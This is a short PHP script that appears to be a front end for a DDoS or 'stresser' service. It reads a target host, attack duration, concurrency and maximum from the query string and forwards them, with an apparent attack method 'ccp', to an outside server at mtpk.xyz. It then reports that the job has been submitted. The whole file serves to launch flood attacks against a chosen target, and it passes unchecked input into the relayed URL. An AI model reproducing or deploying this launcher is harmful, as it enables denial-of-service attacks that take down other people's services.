<?php

$host = $_GET['host'];
$time = $_GET['time'];
$cx = $_GET['cx'];
$max = $_GET['max'];



if(empty($host)){
    echo "enter host target!";
    exit;
}


$url='http://mtpk.xyz/bg.php/?key=key&host='.$host.'&time='.$time.'&method=ccp&Bing='.$cx.'&max='.$max.'';

$html = file_get_contents($url);

echo'The background has been submitted! Please do not submit repeatedly in a short time';